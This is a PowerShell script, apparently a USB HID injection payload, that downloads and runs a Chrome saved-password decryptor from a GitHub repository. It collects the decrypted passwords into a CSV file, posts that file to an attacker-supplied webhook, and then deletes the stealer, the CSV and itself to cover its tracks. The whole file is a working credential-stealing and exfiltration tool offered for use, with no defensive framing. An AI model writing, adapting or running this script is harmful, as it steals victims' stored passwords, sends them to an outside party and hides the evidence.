param (
  [string]$webhookUrl
)

$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"

py -m pip install pycryptodomex pywin32

Invoke-WebRequest -Uri https://github.com/simen64/Pico-HID-Scripts/blob/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py

& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py



$user = $env:USERNAME

$file = "C:\Users\$user\Documents\decrypted_password.csv"

$message = "Extracted passwords:"

$boundary = [System.Guid]::NewGuid().ToString()

$fileContent = [System.IO.File]::ReadAllBytes($file)

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"content`"",
    "",
    $message,
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"file.txt`"",
    "Content-Type: application/octet-stream",
    "",
    [System.Text.Encoding]::Default.GetString($fileContent),
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body

Remove-Item stealer.py -Force
Remove-item decrypted_password.csv -Force
Remove-Item -Path $MyInvocation.MyCommand.Source

pause
